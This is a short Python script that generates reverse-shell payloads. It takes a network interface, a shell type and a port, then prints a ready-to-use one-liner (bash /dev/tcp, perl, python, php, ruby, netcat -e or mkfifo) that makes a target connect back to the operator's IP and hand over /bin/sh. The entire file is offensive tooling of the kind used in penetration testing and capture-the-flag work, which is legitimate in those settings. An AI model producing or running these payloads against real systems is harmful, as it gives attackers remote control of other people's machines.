#!/usr/bin/python3
import netifaces as ni
import sys, os, signal


def reverse_shell(ip, port, tipo):
    if(tipo == 'bash'):
        print('bash -i >& /dev/tcp/'+ip+'/'+port+' 0>&1\n')
    elif(tipo == 'perl'):
        print('perl -e \'use Socket;$i="'+ip+'";$p='+port+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' ')       
    elif(tipo == 'python'):
        print('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'+ip+'",'+port+'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' ')
    elif(tipo == 'php'):
        print('php -r \'$sock=fsockopen("'+ip+'",'+port+');exec("/bin/sh -i <&3 >&3 2>&3");\'')
    elif(tipo == 'ruby'):
        print('ruby -rsocket -e\'f=TCPSocket.open("'+ip+'",'+port+').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'')
    elif(tipo == 'netcat'):
        print('nc -e /bin/sh '+ip+' '+port+'')
    elif(tipo == 'mkfifo'):
        print('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+ip+' '+port+' >/tmp/f')
    else:
        print("[!] type of reverse shell not found... \n")
        sys.exit(1)

def get_ip_address(interfaz):
    ni.ifaddresses(interfaz) # crea un diccionario con datos de la interfaz seleccionada
    ip = ni.ifaddresses(interfaz)[ni.AF_INET][0]['addr'] # Selecciona el campo donde esta la IP
    return(ip)

def usage(filename):
    print("Usage: python3 ",filename," -I <interface> -R <revshell> -P <port>\n")
    print("\t <interface> : eth0 | tun0 | wlan0\n")
    print("\t <revshell> : bash | perl | python | php | ruby | netcat | mkfifo\n")
    print("\t <port> : Your favorite port. Default 1234\n")
    print("\t Reverse Shells based in https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n")
    print("\t The interfaces depend on what appears with the \"ifconfig\" command\n")

def error():
    print("[!] Error...")
    sys.exit(1)

def def_handler(sig, frame):
    print("\n[!] Saliendo... \n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def main(): # Solo sirve para setear parametros de entrada
    argumentos = len(sys.argv)-1
    if(argumentos > 6 or argumentos < 4):
        usage(sys.argv[0])
        sys.exit(1)
    elif('-I' not in sys.argv[1:] or '-R' not in sys.argv[1:]):
        usage(sys.argv[0])
        sys.exit(1)
    else:
        if('-P' not in sys.argv[1:]):
            port = '1234'
            interfaz = sys.argv[sys.argv.index('-I') + 1] 
            revshell = sys.argv[sys.argv.index('-R') + 1]
            IP = get_ip_address(interfaz)
            reverse_shell(IP,port,revshell)

            
        else:
            port = sys.argv[sys.argv.index('-P') + 1] 
            interfaz = sys.argv[sys.argv.index('-I') + 1] 
            revshell = sys.argv[sys.argv.index('-R') + 1]
            IP = get_ip_address(interfaz)
            reverse_shell(IP,port,revshell)
            


if __name__ == '__main__':
    main()
